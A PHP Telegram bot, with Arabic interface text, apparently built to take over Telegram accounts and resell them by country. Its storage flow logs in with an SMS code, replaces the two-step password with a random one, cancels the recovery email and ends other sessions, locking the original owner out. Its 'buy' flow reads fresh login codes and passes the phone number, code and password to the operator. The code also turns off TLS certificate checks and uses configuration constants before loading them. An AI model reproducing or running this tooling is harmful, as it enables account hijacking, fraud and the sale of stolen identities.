<?php
// فحص الملفات الضرورية وإرسال تقرير للمشرف
$pharFile = __DIR__ . '/madeline-8.6.5.phar';
$tempDir = sys_get_temp_dir();
$pharInTemp = $tempDir . '/madeline-8.6.5.phar';

$report = "📁 **تقرير الملفات**\n";
$report .= "- madeline.php: " . (file_exists(__DIR__ . '/madeline.php') ? '✅' : '❌') . "\n";
$report .= "- madeline-8.6.5.phar (في المجلد الحالي): " . (file_exists($pharFile) ? '✅' : '❌') . "\n";
$report .= "- madeline-8.6.5.phar (في tmp): " . (file_exists($pharInTemp) ? '✅' : '❌') . "\n";
$report .= "- مجلد الجلسات: " . (is_dir(SESSIONS_PATH) ? '✅' : '❌') . "\n";
sendMessage(ADMIN_ID, $report); // أرسل التقرير لك عبر البوت
require __DIR__ . '/madeline.php';
require __DIR__ . '/config.php';

use danog\MadelineProto\API;
use danog\MadelineProto\Settings\AppInfo;
use danog\MadelineProto\Settings;

$db = new PDO('sqlite:' . DB_PATH);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// إنشاء الجداول (مع إضافة عمود code_hash)
$db->exec("
CREATE TABLE IF NOT EXISTS countries (
    code TEXT PRIMARY KEY,
    name TEXT,
    flag TEXT
);
CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phone TEXT UNIQUE,
    country_code TEXT,
    session_file TEXT,
    password TEXT,
    status TEXT DEFAULT 'active',
    stored_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS activation_sessions (
    phone TEXT,
    admin_id INTEGER,
    step TEXT,
    temp_file TEXT,
    country_code TEXT,
    code_hash TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS pending_orders (
    account_id INTEGER PRIMARY KEY,
    buyer_id INTEGER,
    requested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
");

// قائمة بسيطة لأشهر الدول (للعرض فقط، يمكن إضافة المزيد)
$popularCountries = [
    '93'  => ['name' => 'أفغانستان', 'flag' => '🇦🇫'],
    '213' => ['name' => 'الجزائر', 'flag' => '🇩🇿'],
    '20'  => ['name' => 'مصر', 'flag' => '🇪🇬'],
    '964' => ['name' => 'العراق', 'flag' => '🇮🇶'],
    '962' => ['name' => 'الأردن', 'flag' => '🇯🇴'],
    '965' => ['name' => 'الكويت', 'flag' => '🇰🇼'],
    '961' => ['name' => 'لبنان', 'flag' => '🇱🇧'],
    '218' => ['name' => 'ليبيا', 'flag' => '🇱🇾'],
    '212' => ['name' => 'المغرب', 'flag' => '🇲🇦'],
    '968' => ['name' => 'عمان', 'flag' => '🇴🇲'],
    '970' => ['name' => 'فلسطين', 'flag' => '🇵🇸'],
    '974' => ['name' => 'قطر', 'flag' => '🇶🇦'],
    '966' => ['name' => 'السعودية', 'flag' => '🇸🇦'],
    '963' => ['name' => 'سوريا', 'flag' => '🇸🇾'],
    '216' => ['name' => 'تونس', 'flag' => '🇹🇳'],
    '90'  => ['name' => 'تركيا', 'flag' => '🇹🇷'],
    '971' => ['name' => 'الإمارات', 'flag' => '🇦🇪'],
    '967' => ['name' => 'اليمن', 'flag' => '🇾🇪'],
    '1'   => ['name' => 'الولايات المتحدة/كندا', 'flag' => '🇺🇸🇨🇦'],
    '44'  => ['name' => 'المملكة المتحدة', 'flag' => '🇬🇧'],
    '49'  => ['name' => 'ألمانيا', 'flag' => '🇩🇪'],
    '33'  => ['name' => 'فرنسا', 'flag' => '🇫🇷'],
    '39'  => ['name' => 'إيطاليا', 'flag' => '🇮🇹'],
    '34'  => ['name' => 'إسبانيا', 'flag' => '🇪🇸'],
    '7'   => ['name' => 'روسيا', 'flag' => '🇷🇺'],
    '86'  => ['name' => 'الصين', 'flag' => '🇨🇳'],
    '91'  => ['name' => 'الهند', 'flag' => '🇮🇳'],
    '81'  => ['name' => 'اليابان', 'flag' => '🇯🇵'],
    '82'  => ['name' => 'كوريا الجنوبية', 'flag' => '🇰🇷'],
    '55'  => ['name' => 'البرازيل', 'flag' => '🇧🇷'],
    '61'  => ['name' => 'أستراليا', 'flag' => '🇦🇺'],
];

foreach ($popularCountries as $code => $info) {
    $stmt = $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)");
    $stmt->execute([$code, $info['name'], $info['flag']]);
}

// دالة التعرف على الدولة (تعمل لأي رقم، وتضيف الرموز الجديدة تلقائياً)
function getCountryByPhone($phone, $db) {
    if (preg_match('/^\+(\d{1,4})/', $phone, $matches)) {
        $code = $matches[1];
        $stmt = $db->prepare("SELECT code, name, flag FROM countries WHERE code = ?");
        $stmt->execute([$code]);
        $country = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($country) return $country;
        // إضافة رمز جديد
        $name = "رمز $code";
        $flag = '🏴';
        $stmt = $db->prepare("INSERT OR IGNORE INTO countries (code, name, flag) VALUES (?, ?, ?)");
        $stmt->execute([$code, $name, $flag]);
        return ['code' => $code, 'name' => $name, 'flag' => $flag];
    }
    return null;
}

function botApi($method, $params) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

function sendMessage($chat_id, $text, $keyboard = null) {
    $params = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    botApi('sendMessage', $params);
}

function editMessage($chat_id, $msg_id, $text, $keyboard = null) {
    $params = ['chat_id' => $chat_id, 'message_id' => $msg_id, 'text' => $text, 'parse_mode' => 'HTML'];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    botApi('editMessageText', $params);
}

$update = json_decode(file_get_contents('php://input'), true);
if (!$update) exit;

$message = $update['message'] ?? null;
$callback = $update['callback_query'] ?? null;
$chat_id = $message['chat']['id'] ?? ($callback['message']['chat']['id'] ?? 0);
$user_id = $message['from']['id'] ?? ($callback['from']['id'] ?? 0);
$msg_id = $callback['message']['message_id'] ?? 0;

if ($user_id != ADMIN_ID) {
    if ($message) sendMessage($chat_id, "⛔ غير مصرح");
    exit;
}

if ($message && trim($message['text'] ?? '') === '/start') {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '📦 تخزين حسابات تلجرام', 'callback_data' => 'store']],
            [['text' => '🛒 جلب حسابات تلجرام', 'callback_data' => 'buy']],
            [['text' => '🌍 عرض الدول والمخزون', 'callback_data' => 'stock']]
        ]
    ];
    sendMessage($chat_id, "مرحبًا بك في بوت إدارة حسابات تيلجرام.\nاختر إحدى الخدمات:", $keyboard);
    exit;
}

// ===================== معالجة الأزرار =====================
if ($callback) {
    botApi('answerCallbackQuery', ['callback_query_id' => $callback['id']]);
    $data = $callback['data'];

    if ($data === 'store') {
        $tempFile = '/tmp/temp_' . uniqid();
        $db->prepare("INSERT INTO activation_sessions (admin_id, step, temp_file) VALUES (?, 'awaiting_phone', ?)")->execute([$user_id, $tempFile]);
        sendMessage($chat_id, "📱 أرسل رقم الهاتف مع رمز الدولة:\nمثال: +967XXXXXXXX");
        exit;
    }
    elseif ($data === 'buy') {
        $stmt = $db->query("SELECT country_code, COUNT(*) as cnt FROM accounts WHERE status='active' GROUP BY country_code");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (!$rows) {
            sendMessage($chat_id, "📭 لا يوجد حسابات متاحة حاليًا.");
        } else {
            $buttons = [];
            foreach ($rows as $row) {
                $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
                $stmt_c->execute([$row['country_code']]);
                $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
                $buttons[] = [['text' => "{$c['flag']} {$c['name']} ({$row['cnt']})", 'callback_data' => "buy_country_{$row['country_code']}"]];
            }
            sendMessage($chat_id, "اختر الدولة:", ['inline_keyboard' => $buttons]);
        }
        exit;
    }
    elseif ($data === 'stock') {
        $stmt = $db->query("SELECT country_code, COUNT(*) as cnt FROM accounts WHERE status='active' GROUP BY country_code");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (!$rows) {
            sendMessage($chat_id, "📭 لا يوجد حسابات في المخزون.");
        } else {
            $msg = "📊 المخزون الحالي:\n";
            foreach ($rows as $row) {
                $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
                $stmt_c->execute([$row['country_code']]);
                $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
                $msg .= "{$c['flag']} {$c['name']} : {$row['cnt']} حسابات\n";
            }
            sendMessage($chat_id, $msg);
        }
        exit;
    }
    elseif (preg_match('/^buy_country_(\w+)$/', $data, $match)) {
        $country_code = $match[1];
        $stmt = $db->prepare("SELECT id, phone, country_code FROM accounts WHERE country_code=? AND status='active' LIMIT 1");
        $stmt->execute([$country_code]);
        $acc = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$acc) {
            sendMessage($chat_id, "❌ لا يوجد حسابات متاحة لهذه الدولة حاليًا.");
            exit;
        }
        $db->prepare("INSERT OR REPLACE INTO pending_orders (account_id, buyer_id) VALUES (?, ?)")->execute([$acc['id'], $user_id]);
        $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
        $stmt_c->execute([$acc['country_code']]);
        $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
        $msg = "📋 معلومات الحساب:\n"
             . "الدولة: {$c['flag']} {$c['name']}\n"
             . "📞 الرقم: {$acc['phone']}\n"
             . "🔑 الكود: (قيد الانتظار)\n"
             . "🕒 الساعة: " . date('Y-m-d H:i:s');
        $keyboard = ['inline_keyboard' => [[['text' => '📲 طلب الكود', 'callback_data' => "request_code_{$acc['id']}"]]]];
        sendMessage($chat_id, $msg, $keyboard);
        exit;
    }
    elseif (preg_match('/^request_code_(\d+)$/', $data, $match)) {
        $acc_id = (int)$match[1];
        $stmt = $db->prepare("SELECT id, phone, session_file, password, country_code FROM accounts WHERE id=? AND status='active'");
        $stmt->execute([$acc_id]);
        $acc = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$acc) {
            sendMessage($chat_id, "⚠️ هذا الحساب لم يعد متوفرًا.");
            exit;
        }
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        $mad = new API($acc['session_file'], $settings);
        $mad->start();
        try {
            $mad->phoneLogin($acc['phone']);
            $code = null;
            for ($i = 0; $i < 8; $i++) {
                sleep(1);
                $msgs = $mad->messages->getHistory(['limit' => 5]);
                foreach ($msgs['messages'] as $m) {
                    if (isset($m['message']) && preg_match('/\b(\d{5,6})\b/', $m['message'], $matchCode)) {
                        $code = $matchCode[1];
                        break 2;
                    }
                }
            }
            if (!$code) {
                sendMessage($chat_id, "لم نستلم الكود، حاول مجددًا.");
                exit;
            }
            $password = $acc['password'] ?? 'لا توجد كلمة مرور';
            sendMessage($chat_id, "📲 بيانات الحساب:\n📞 {$acc['phone']}\n🔑 الكود: $code\n🔐 كلمة المرور: $password");
            $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
            $stmt_c->execute([$acc['country_code']]);
            $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
            $newText = "📋 معلومات الحساب:\n"
                     . "الدولة: {$c['flag']} {$c['name']}\n"
                     . "📞 الرقم: {$acc['phone']}\n"
                     . "🔑 الكود: $code\n"
                     . "🔐 كلمة السر: $password\n"
                     . "🕒 الساعة: " . date('Y-m-d H:i:s');
            $keyboard = [
                'inline_keyboard' => [
                    [['text' => '📲 طلب الكود مرة أخرى', 'callback_data' => "request_code_{$acc_id}"]],
                    [['text' => '🚪 تسجيل الخروج من الحساب', 'callback_data' => "logout_account_{$acc_id}"]]
                ]
            ];
            editMessage($chat_id, $msg_id, $newText, $keyboard);
        } catch (Exception $e) {
            sendMessage($chat_id, "❌ فشل طلب الكود: " . $e->getMessage());
        }
        exit;
    }
    elseif (preg_match('/^logout_account_(\d+)$/', $data, $match)) {
        $acc_id = (int)$match[1];
        $stmt = $db->prepare("SELECT session_file FROM accounts WHERE id=?");
        $stmt->execute([$acc_id]);
        $file = $stmt->fetchColumn();
        if ($file && file_exists($file)) {
            try {
                $settings = new Settings();
                $appInfo = new AppInfo();
                $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
                $settings->setAppInfo($appInfo);
                $mad = new API($file, $settings);
                $mad->start();
                $mad->logout();
            } catch (Exception $e) {}
            unlink($file);
        }
        $db->prepare("UPDATE accounts SET status='removed' WHERE id=?")->execute([$acc_id]);
        sendMessage($chat_id, "✅ تم تسجيل الخروج وإزالة الحساب من المخزون.");
        editMessage($chat_id, $msg_id, "🚫 هذا الحساب تم تسجيل الخروج منه ولم يعد متاحًا.");
        exit;
    }
    exit;
}

// ===================== معالجة الرسائل النصية (تخزين حساب جديد) =====================
if ($message && !$callback) {
    $text = trim($message['text'] ?? '');
    $stmt = $db->prepare("SELECT * FROM activation_sessions WHERE admin_id=? ORDER BY created_at DESC LIMIT 1");
    $stmt->execute([$user_id]);
    $session = $stmt->fetch(PDO::FETCH_ASSOC);

    // مرحلة انتظار الرقم
    if ($session && $session['step'] === 'awaiting_phone' && preg_match('/^\+\d+$/', $text)) {
        $phone = $text;
        $country = getCountryByPhone($phone, $db);
        if (!$country) {
            sendMessage($chat_id, "❌ لم نتعرف على الدولة من هذا الرقم. تأكد من إرسال الرقم مع رمز الدول الصحيح (مثال: +967XXXXXXXX)");
            exit;
        }
        $db->prepare("UPDATE activation_sessions SET phone=?, country_code=?, step='awaiting_code' WHERE admin_id=?")->execute([$phone, $country['code'], $user_id]);
        $tempFile = $session['temp_file'];
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        $mad = new API($tempFile, $settings);
        try {
            $sentCode = $mad->phoneLogin($phone);
            $phone_code_hash = $sentCode['phone_code_hash'];
            $db->prepare("UPDATE activation_sessions SET code_hash=? WHERE admin_id=?")->execute([$phone_code_hash, $user_id]);
            sendMessage($chat_id, "✅ تم إرسال كود التفعيل إلى $phone. أرسل الكود الآن:");
        } catch (Exception $e) {
            sleep(2);
            try {
                $sentCode = $mad->phoneLogin($phone);
                $phone_code_hash = $sentCode['phone_code_hash'];
                $db->prepare("UPDATE activation_sessions SET code_hash=? WHERE admin_id=?")->execute([$phone_code_hash, $user_id]);
                sendMessage($chat_id, "✅ تم إرسال كود التفعيل (محاولة ثانية) إلى $phone. أرسل الكود الآن:");
            } catch (Exception $e2) {
                sendMessage($chat_id, "❌ فشل إرسال الكود: " . $e2->getMessage());
                $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            }
        }
        exit;
    }
    // مرحلة انتظار الكود
    elseif ($session && $session['step'] === 'awaiting_code' && is_numeric($text)) {
        $phone = $session['phone'];
        $tempFile = $session['temp_file'];
        $code_hash = $session['code_hash'] ?? '';
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        $mad = new API($tempFile, $settings);
        try {
            $authorization = $mad->completePhoneLogin($text, $code_hash);
            if ($authorization['_'] === 'account.password') {
                $db->prepare("UPDATE activation_sessions SET step='awaiting_password' WHERE admin_id=?")->execute([$user_id]);
                sendMessage($chat_id, "🔐 الحساب محمي بكلمة مرور خطوتين. أرسل كلمة المرور القديمة:");
                exit;
            }
            $newPassword = bin2hex(random_bytes(8));
            try {
                $mad->update2fa(['password' => $newPassword]);
            } catch (Exception $e) {}
            try {
                $mad->account->cancelPasswordEmail();
                $mad->account->resetAuthorization();
            } catch (Exception $e) {}
            $finalSession = '/tmp/' . md5($phone) . '.madeline';
            copy($tempFile, $finalSession);
            unlink($tempFile);
            $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")
                ->execute([$phone, $session['country_code'], $finalSession, $newPassword]);
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
            $stmt_c->execute([$session['country_code']]);
            $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
            sendMessage($chat_id, "🎉 تم تخزين الحساب بنجاح!\nالدولة: {$c['flag']} {$c['name']}\nكلمة المرور الجديدة: $newPassword");
        } catch (Exception $e) {
            sendMessage($chat_id, "❌ فشل التحقق من الكود: " . $e->getMessage());
        }
        exit;
    }
    // مرحلة انتظار كلمة المرور القديمة
    elseif ($session && $session['step'] === 'awaiting_password') {
        $oldPass = $text;
        $phone = $session['phone'];
        $tempFile = $session['temp_file'];
        $settings = new Settings();
        $appInfo = new AppInfo();
        $appInfo->setApiId(API_ID)->setApiHash(API_HASH);
        $settings->setAppInfo($appInfo);
        $mad = new API($tempFile, $settings);
        try {
            $authorization = $mad->complete2faLogin($oldPass);
            $newPassword = bin2hex(random_bytes(8));
            try {
                $mad->update2fa(['password' => $newPassword]);
            } catch (Exception $e) {}
            try {
                $mad->account->cancelPasswordEmail();
                $mad->account->resetAuthorization();
            } catch (Exception $e) {}
            $finalSession = '/tmp/' . md5($phone) . '.madeline';
            copy($tempFile, $finalSession);
            unlink($tempFile);
            $db->prepare("INSERT INTO accounts (phone, country_code, session_file, password, status) VALUES (?,?,?,?,'active')")
                ->execute([$phone, $session['country_code'], $finalSession, $newPassword]);
            $db->prepare("DELETE FROM activation_sessions WHERE admin_id=?")->execute([$user_id]);
            $stmt_c = $db->prepare("SELECT name, flag FROM countries WHERE code=?");
            $stmt_c->execute([$session['country_code']]);
            $c = $stmt_c->fetch(PDO::FETCH_ASSOC);
            sendMessage($chat_id, "🎉 تم تخزين الحساب بنجاح!\nالدولة: {$c['flag']} {$c['name']}\nكلمة المرور الجديدة: $newPassword");
        } catch (Exception $e) {
            sendMessage($chat_id, "❌ كلمة المرور خاطئة: " . $e->getMessage());
        }
        exit;
    }
    else {
        sendMessage($chat_id, "⚠️ أرسل /start للبدء");
    }
}
?>